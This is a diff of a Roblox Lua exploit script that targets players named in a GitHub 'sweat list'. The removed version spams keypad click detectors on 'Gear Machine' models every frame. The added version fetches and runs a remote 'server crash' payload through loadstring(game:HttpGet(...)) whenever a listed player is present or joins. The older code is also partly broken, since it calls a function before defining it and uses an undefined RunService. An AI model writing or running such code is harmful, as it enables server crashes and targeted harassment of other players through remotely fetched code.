@@ -1,185 +1,53 @@
--- URL to fetch usernames from
-pcall(function()
+local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local player = Players.LocalPlayer
 
-local function destroyLauncher(character)
-    local launcher = player:FindFirstChild("BigRocketLauncher")
-    if launcher then
-        launcher:Destroy()
-    end
-end
-
--- Connect to CharacterAdded to trigger on spawn/respawn
-player.CharacterAdded:Connect(destroyLauncher)
-
--- Run for the first time in case the player already spawned
-if player.Character then
-    destroyLauncher(player.Character)
-end
-
-print("running the shit lol")
+-- GitHub URL for the list of usernames
 local url = "https://raw.githubusercontent.com/n0raxd/the-sweat-list/refs/heads/main/sweats?token=$(date +%s)"
-local usernames = {}
 
--- Function to get usernames from the URL
+-- Table to store usernames fetched from the URL
+local usernamesToCheck = {}
+
+-- Function to fetch and update the usernames from the GitHub URL
 local function updateUsernames()
-    local response = game:HttpGet(url)
-    usernames = {}
-    for username in response:gmatch("[^\r\n]+") do
-        table.insert(usernames, username)
+    local success, result = pcall(function()
+        return game:HttpGet(url)
+    end)
+    
+    if success then
+        -- Split the result into lines and populate the table
+        usernamesToCheck = {}
+        for line in result:gmatch("[^\r\n]+") do
+            table.insert(usernamesToCheck, line)
+        end
+        print("Usernames successfully updated.")
+    else
+        warn("Failed to fetch usernames: " .. tostring(result))
     end
-    print("Usernames updated.")
 end
 
--- Initial fetch of usernames
+-- Function to check if a username is in our list
+local function isInList(username)
+    for _, name in ipairs(usernamesToCheck) do
+        if name:lower() == username:lower() then
+            return true
+        end
+    end
+    return false
+end
+
+-- Update usernames on script start
 updateUsernames()
 
-while task.wait() do
-checkPlayers(usernames)
-end
-
-
--- Check if a player in the game matches any username from the list
-local function checkPlayers(usernames)
-    for _, player in ipairs(game.Players:GetPlayers()) do
-        for _, username in ipairs(usernames) do
-            if player.Name == username then
-                -- shitty game security lmfao
-local function findGearMachineKeypads()
-    local keypads = {}
-
-    -- Recursive function to search within services or models
-    local function search(container)
-        for _, object in ipairs(container:GetChildren()) do
-            if object:IsA("Model") and object.Name == "Gear Machine" then
-                local keypad = object:FindFirstChild("Keypad") -- Adjust "Keypad" if needed
-                if keypad then
-                    table.insert(keypads, keypad)
-                end
-            end
-
-            if object:IsA("Model") or object:IsA("Folder") then
-                search(object)
-            end
-        end
-    end
-
-    -- Search relevant containers
-    search(game.Workspace)
-    return keypads
-end
-
--- Get all keypads from Gear Machines
-local foundKeypads = findGearMachineKeypads()
-
--- Print and store keypads globally for debugging purposes
-for index, keypad in ipairs(foundKeypads) do
-    _G["keypad" .. index] = keypad
-    print("keypad" .. index .. ": " .. keypad:GetFullName())
-end
-
--- Variable to keep track of the current keypad being processed
-local currentKeypad
-
--- Function to simulate typing on the keypad
-function typegear(inputValue)
-    if not currentKeypad then
-        warn("No keypad selected.")
-        return
-    end
-
-    for i = 1, #inputValue do
-        local buttonName = inputValue:sub(i, i) -- Extract each character
-        local button = currentKeypad:FindFirstChild(buttonName) -- Find the button by name
-
-        if button then
-            local clickDetector = button:FindFirstChild("RangeC") -- Adjust "RangeC" if needed
-
-            if clickDetector then
-                fireclickdetector(clickDetector) -- Fire the click detector
-                print("Clicked button '" .. buttonName .. "' on keypad: " .. currentKeypad.Name)
-            else
-                warn("Click detector 'RangeC' not found in button " .. buttonName)
-            end
-        else
-            warn("Button named '" .. buttonName .. "' not found in the keypad.")
-        end
+-- Check existing players
+for _, player in ipairs(Players:GetPlayers()) do
+    if isInList(player.Name) then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/n0raxd/the-sweat-list/refs/heads/main/server%20crash"))()
     end
 end
 
--- Process all keypads found
-for _, keypad in ipairs(foundKeypads) do
-    currentKeypad = keypad -- Set the current keypad
-    fireclickdetector(keypad:FindFirstChild("Clear"):FindFirstChild("RangeC"))
-    typegear("6418277837") -- Example input sequence, replace with your own
-end
-
-RunService.Heartbeat:Connect(function()
-    for _, keypad in ipairs(foundKeypads) do
-        fireclickdetector(keypad:FindFirstChild("Enter"):FindFirstChild("RangeC"))
+-- Monitor for new players joining
+Players.PlayerAdded:Connect(function(player)
+    if isInList(player.Name) then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/n0raxd/the-sweat-list/refs/heads/main/server%20crash"))()
     end
-end)
-            end
-        end
-    end
-end
-
--- Monitor player joins and check for matching usernames
-game.Players.PlayerAdded:Connect(function(player)
-    for _, username in ipairs(usernames) do
-        if player.Name == username then
-           -- shitty game security lmfao
-local function findGearMachineKeypads()
-    local keypads = {}
-
-    -- Recursive function to search within services or models
-    local function search(container)
-        for _, object in ipairs(container:GetChildren()) do
-            if object:IsA("Model") and object.Name == "Gear Machine" then
-                local keypad = object:FindFirstChild("Keypad") -- Adjust "Keypad" if needed
-                if keypad then
-                    table.insert(keypads, keypad)
-                end
-            end
-
-            if object:IsA("Model") or object:IsA("Folder") then
-                search(object)
-            end
-        end
-    end
-
-    -- Search relevant containers
-    search(game.Workspace)
-
-    return keypads
-end
-
--- Get all keypads from Gear Machines
-local foundKeypads = findGearMachineKeypads()
-
--- Print and store keypads globally for debugging purposes
-for index, keypad in ipairs(foundKeypads) do
-    _G["keypad" .. index] = keypad
-    print("keypad" .. index .. ": " .. keypad:GetFullName())
-end
-
--- Process all keypads found
-for _, keypad in ipairs(foundKeypads) do
-    currentKeypad = keypad -- Set the current keypad
-    fireclickdetector(keypad:FindFirstChild("Clear"):FindFirstChild("RangeC"))
-    typegear("6418277837") -- Example input sequence, replace with your own
-end
-
-RunService.Heartbeat:Connect(function()
-    for _, keypad in ipairs(foundKeypads) do
-        fireclickdetector(keypad:FindFirstChild("Enter"):FindFirstChild("RangeC"))
-    end
-end)
-        end
-    end
-end)
-
--- Check current players already in the game
-checkPlayers(usernames)
 end)
